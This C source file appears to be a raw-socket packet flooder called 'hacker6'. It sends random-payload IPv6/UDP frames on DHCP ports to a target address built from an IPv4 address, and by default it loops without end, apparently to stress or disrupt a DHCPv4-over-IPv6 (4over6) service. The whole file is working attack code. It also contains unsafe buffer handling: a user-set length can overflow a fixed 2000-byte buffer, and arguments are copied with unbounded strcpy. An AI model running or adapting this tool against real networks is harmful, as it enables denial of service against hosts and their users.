#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/ip.h> 
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/ip.h> 
#include <netinet/ip6.h> 
#include <netinet/udp.h> 
#include <string.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <errno.h>

#include "socket.h"

int count = 0;
int len = 1400;
char local_ipv6_addr_name[100];
char target_ipv4_addr_name[100];
char target_ipv6_addr_name[100];
char device_name[100];
unsigned short dst_port = 68;
unsigned short src_port = 67;
//int ipv6_fd;
int s_send6;
struct sockaddr_in6 dest;
struct sockaddr_in6 remote_addr6;
struct sockaddr_ll device;

static void usage()
{
	printf("Usage : hacker6 [options] <local_ipv6_addr> <target_ipv4_addr>\n");
	printf("			options:  -n <count>		 default value: 0\n");
	printf("					  -l <packet_len>	 default value: 1400\n");
	printf("					  -i <device_name>	 default value: eth1\n");
}

void init_socket()
{
/*
	if ((ipv6_fd = socket(AF_INET6, SOCK_DGRAM, 0)) < 0) {
		fprintf(stderr, "Failed to create sockfd!\n");
		exit(1);
	}
	
	memset(&dest, 0, sizeof(dest));
	dest.sin6_family = AF_INET6;
	dest.sin6_port = htons(dst_port);
	char addr[200] = {0};
	sprintf(target_ipv6_addr_name, "2001:da8:200:900e:0:5efe:%s", target_ipv4_addr_name);
	if (inet_pton(AF_INET6, addr, &dest.sin6_addr) < 0) {
		fprintf(stderr, "Failed to resolve server_addr : %s\n", addr);
		exit(1);
	}
*/
	s_send6 = socket(PF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (s_send6 < 0)
	{
		printf("[4over6 CRA]: Failed to create send socket.\n");
		exit(0);
	}  
	
	remote_addr6.sin6_family = AF_INET6;
    inet_pton(AF_INET6, target_ipv6_addr_name, &(remote_addr6.sin6_addr));
}

static uint16_t udpchecksum(char *iphead, char *udphead, int udplen, int type)
{
	udphead[6] = udphead[7] = 0;
	uint32_t checksum = 0;
	//printf("udp checksum is 0x%02x%02x\n", (uint8_t)udphead[6], (uint8_t)udphead[7]);
	if (type == 6)
	{
		struct udp6_psedoheader header;
		memcpy(header.srcaddr, iphead + 24, 16);
		memcpy(header.dstaddr, iphead + 8, 16);
		header.length = ntohs(udplen);
		header.zero1 = header.zero2 = 0;
		header.next_header = 0x11;
		uint16_t *hptr = (uint16_t*)&header;
		int hlen = sizeof(header);
		while (hlen > 0) {
			checksum += *(hptr++);
			hlen -= 2;
		}
	}
	else if (type == 4)
	{
		struct udp4_psedoheader header;
		memcpy((char*)&header.srcaddr, iphead + 12, 4);
		memcpy((char*)&header.dstaddr, iphead + 16, 4);
		header.zero = 0;
		header.protocol = 0x11;
		header.length = ntohs(udplen);
		uint16_t *hptr = (uint16_t*)&header;
		int hlen = sizeof(header);
		while (hlen > 0) {
			checksum += *(hptr++);
			hlen -= 2;
		}
	}	
	uint16_t *uptr = (uint16_t*)udphead;
	while (udplen > 1) {	
		checksum += *(uptr++);
		udplen -= 2;
	}
	if (udplen) {
		checksum += (*((uint8_t*)uptr)) ;
	}
	do {
		checksum = (checksum >> 16) + (checksum & 0xFFFF);
	} while (checksum != (checksum & 0xFFFF));
	uint16_t ans = checksum;
	return (ans == 0xFF)? 0xFF :ntohs(~ans);
}

static uint16_t checksum(uint16_t *addr, int len)
{
	int nleft = len;
	int sum = 0;
	uint16_t *w = addr;
	uint16_t answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= sizeof (uint16_t);
	}

	if (nleft == 1) {
		*(uint8_t *) (&answer) = *(uint8_t *) w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;
	return (answer);
}

void send_packet6(char* packet, int len)
{
	struct ip6_hdr *ip6hdr = (struct ip6_hdr *)(packet + 14);
	ip6hdr->ip6_flow = htonl((6 << 28) | (0 << 20) | 0);		
	ip6hdr->ip6_plen = htons(len - 14 - 40);
	ip6hdr->ip6_nxt = IPPROTO_UDP;
	ip6hdr->ip6_hops = 128;
	inet_pton(AF_INET6, local_ipv6_addr_name, &(ip6hdr->ip6_src));
	inet_pton(AF_INET6, target_ipv6_addr_name, &(ip6hdr->ip6_dst));	
	
	struct udphdr *udp = (struct udphdr*)(packet + 14 + 40);
	udp->source = htons(src_port);
	udp->dest = htons(dst_port);
	udp->len = htons(len - 14 - 40);
	udp->check = 0;
	uint16_t newchecksum = udpchecksum(packet + 14, packet + 14 + 40, len - 14 - 40, 6);
	packet[14 + 40 + 6] = (newchecksum >> 8) & 0xFF;
    packet[14 + 40 + 7] = newchecksum & 0xFF;
    
    memset(packet, 0xff, 6);
    memset(packet + 6, 0x0, 6);
    packet[12] = 0x86;
    packet[13] = 0xdd;

    //if (sendto(s_send6, packet, len, 0, (struct sockaddr *)&remote_addr6, sizeof(remote_addr6)) < 0) {
    if (sendto(s_send6, packet, len, 0, (struct sockaddr *)&device, sizeof(device)) < 0) {
        printf("[4over6 CRA]: Failed to send out dhcpv4-over-v6 packet.\n");
        exit(0);
    }
}

void sendpacket()
{
	char buf[2000];
	int i;
	for (i = 0; i < len; ++i)
		buf[i] = rand() & 0xFF;
	send_packet6(buf, len);
}

int main(int argc, char **argv)
{
	strcpy(device_name, "eth1");
	int i;
	for (i = 1; i < argc; ++i) {
		if (i + 1 < argc && strcmp(argv[i], "-n") == 0) {
			++i;
			sscanf(argv[i], "%d", &count);
		} else if (i + 1 < argc && strcmp(argv[i], "-l") == 0) {
			++i;
			sscanf(argv[i], "%d", &len);
		} else if (i + 1 < argc && strcmp(argv[i], "-i") == 0) {
			++i;
			strcpy(device_name, argv[i]);
		} else if (i + 1 < argc) {
			strcpy(local_ipv6_addr_name, argv[i++]);
			strcpy(target_ipv4_addr_name, argv[i]);
			printf("local ipv6 addr : %s\n", local_ipv6_addr_name);
			printf("target ipv4 addr : %s\n", target_ipv4_addr_name);
		} else {//config-interface
			usage();
			return 0;
		}
	}
	if (strlen(local_ipv6_addr_name) == 0 || strlen(target_ipv4_addr_name) == 0) {
		usage();
		return 0;
	}
	sprintf(target_ipv6_addr_name, "2001:da8:200:900e:0:5efe:%s", target_ipv4_addr_name);
	
	if ((device.sll_ifindex = if_nametoindex(device_name)) == 0) {
		fprintf(stderr, "Failed to resolve the index of %s.\n", device_name);
		exit(1);
	}
	
	printf("count=%d\n", count);
	init_socket();
	for (i = 0; i < count || count <= 0; ++i) {
		sendpacket();
	}
}
